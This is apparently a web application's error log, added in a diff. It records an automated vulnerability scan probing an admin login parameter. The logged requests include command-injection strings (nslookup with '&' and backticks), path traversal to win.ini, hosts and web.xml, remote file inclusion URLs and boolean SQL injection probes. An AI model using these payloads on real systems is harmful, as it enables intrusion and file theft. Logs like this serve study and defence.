+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=%26nslookup%20pTcrxUG7%26'%5c"`0%26nslookup%20pTcrxUG7%26`'
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001460s ]
+ERR: 无法加载模块:&nslookup pTcrxUG7&'\"`0&nslookup pTcrxUG7&`'
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<NBP07g<
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000652s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=DRX3ejD4
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000651s ]
+ERR: 无法加载模块:DRX3ejD4
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24{9999346%2b9999336}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000642s ]
+ERR: 无法加载模块:${9999346+9999336}
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000798s ]
+ERR: 无法加载模块:Http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=1some_inexistent_file_with_long_name%00.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000689s ]
+ERR: 无法加载模块:1some_inexistent_file_with_long_name.jpg
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=../../../../../../../../../../windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.007795s ]
+ERR: 无法加载模块:../../../../../../../../../../windows/win.ini
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=Http://testasp.vulnweb.com/t/fit.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000685s ]
+ERR: 无法加载模块:Http://testasp.vulnweb.com/t/fit.txt
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=C:%5cWINDOWS%5csystem32%5cdrivers%5cetc%5chosts
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000638s ]
+ERR: 无法加载模块:C:\WINDOWS\system32\drivers\etc\hosts
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://testasp.vulnweb.com/t/fit.txt%3F.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000672s ]
+ERR: 无法加载模块:Http://testasp.vulnweb.com/t/fit.txt?.jpg
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=testasp.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000578s ]
+ERR: 无法加载模块:Testasp.vulnweb.com
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=../../../../../../../../../../windows/win.ini%00.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000685s ]
+ERR: 无法加载模块:../../../../../../../../../../windows/win.ini.jpg
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000575s ]
+ERR: 无法加载模块:������������������������������������������������windows��win.ini
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=................windowswin.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000681s ]
+ERR: 无法加载模块:................windowswin.ini
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000605s ]
+ERR: 无法加载模块:..\..\..\..\..\..\..\..\windows\win.ini
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=/.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000653s ]
+ERR: 无法加载模块:/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000706s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000657s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000735s ]
+ERR: 无法加载模块:../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000751s ]
+ERR: 无法加载模块:../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=fbcoDnKl
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003299s ]
+ERR: 无法加载模块:FbcoDnKl
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000591s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=unexisting/../../../../../../../../../../windows/win.ini.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000726s ]
+ERR: 无法加载模块:Unexisting/../../../../../../../../../../windows/win.ini.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000724s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=WEB-INF/web.xml
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000593s ]
+ERR: 无法加载模块:WEB-INF/web.xml
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=WEB-INF%5cweb.xml
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000609s ]
+ERR: 无法加载模块:WEB-INF\web.xml
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000617s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=1*1*1*1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000633s ]
+ERR: 无法加载模块:1*1*1*1
+
+[ 2017-11-18T19:59:39+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%202%2b987-987-1=0%2b0%2b0%2b1%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000604s ]
+ERR: 无法加载模块:-1 OR 2+987-987-1=0+0+0+1 -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203%2b987-987-1=0%2b0%2b0%2b1%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000601s ]
+ERR: 无法加载模块:-1 OR 3+987-987-1=0+0+0+1 -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2<(0%2b5%2b987-987)%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000700s ]
+ERR: 无法加载模块:-1 OR 3*2
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2>(0%2b5%2b987-987)%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000791s ]
+ERR: 无法加载模块:-1 OR 3*2>(0+5+987-987) -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=%26n929843=v965130
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000722s ]
+ERR: 无法加载模块:&n929843=v965130
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%202%2b360-360-1=0%2b0%2b0%2b1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000570s ]
+ERR: 无法加载模块:-1 OR 2+360-360-1=0+0+0+1
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203%2b360-360-1=0%2b0%2b0%2b1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000605s ]
+ERR: 无法加载模块:-1 OR 3+360-360-1=0+0+0+1
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000754s ]
+ERR: 无法加载模块:)
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2<(0%2b5%2b360-360)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000675s ]
+ERR: 无法加载模块:-1 OR 3*2
+
